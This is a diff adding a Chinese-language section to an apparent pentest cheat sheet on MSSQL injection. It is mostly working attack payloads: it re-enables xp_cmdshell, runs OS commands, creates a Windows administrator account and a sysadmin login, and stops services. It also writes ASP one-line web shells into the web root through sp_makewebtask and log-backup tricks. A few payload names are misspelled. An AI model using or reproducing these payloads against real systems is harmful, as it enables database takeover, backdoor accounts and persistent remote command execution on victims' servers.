@@ -128,5 +128,75 @@ exec master.dbo.xp_cmdshell username;--
 
 
 #### sqlserver另类玩法
+#### 
+
+- 利用mssql扩展存储注入攻击
+
+  ```mssql
+  1. 检测与恢复扩展存储
+  /*判断xp_cmdhshell扩展存储是否存在*/
+  and 1=(select name from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell')
+  
+  /*判断xp_regread扩展存储过程是否存在*/
+  and 1=(select count(*) from master.dbo.sysobjects where name='xp_regread')
+  
+  /*恢复*/
+  exec sp_configure 'show advanced options',1,reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;
+  exec sp_dropexetendedproc xp_cmdshell, 'xplog70.dll'
+  
+  2. sa权限下扩展存储攻击 利用方法
+  /*安装完插件之后；利用xp_cmdshell扩展，执行任意命令*/
+  /*查看C盘*/
+  drop table black
+  create table black(dire varchar(7996) NULL, id int not null identity(1,1))
+  insert into black exec master..xp_cmdshell 'dir C:\' ;
+  and 1=(select top 1 dire from black where id=1);
+  
+  /*新建windows用户*/
+  exec master..xp_cmdshell 'net user test test /add'
+  exec master..xp_cmdshell 'net localgroup administrators test /add'
+  /*添加和删除一个SA权限的而用户test*/
+  exec master.dbo.sp_addlogin test,password
+  exec master.dbo.sap_addsrvrolemember test,sysadmin
+  /*停掉或激活开个服务（need sa）*/
+  exec master..xp_servicecontrol 'stop','schedule'
+  exec master..xp_servicecontrol 'start','schedule'
+  
+  /*创建之后登陆，利用远程桌面，连接服务器（打开3389）*/
+  
+  /*开启远程数据库*/
+  select * from OPENROWSET('SQLOLEDB','server=servername;uid=sa;pwd=_123', 
+  'select * from table1')
+  
+  ```
+
+  如果防火墙只允许我访问80，可以把80改成别的，但是会影响原来的呀；——端口转发or源控码
+
+- 利用sp_makewebtask写入一句话木马
+
+  要知道绝对路径，否则写不进去
+
+  `;exec sp_makewebtask 'e:\www_iis\yjh.asp','select''%3C%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%63%68%6F%70%70%65%72%22%29%25%3E'''--`
+
+- 写入一句话木马
+
+  找到web目录后，即可写入一句话木马(dbo权限)
+
+  ```mssql
+  ;alter database news set RECOVERY FULL 
+  ;create table test(str image)-- 
+  ;backup log news to disk='c:\test' with init-- 
+  ;insert into test(str)values ('<%excute(request("cmd"))%>')-- 
+  ;backup log news to disk='c:\inetpub\wwwroot\yjh.asp'-- 
+  ;alter database news RECOVERY simple
+  ```
+
+- 
+
+> 端口转发
+>
+> 一句话木马能干嘛
+>
+> 一句话木马怎么写
 
 #### sqlserver差异备份、完全备份、权限入侵
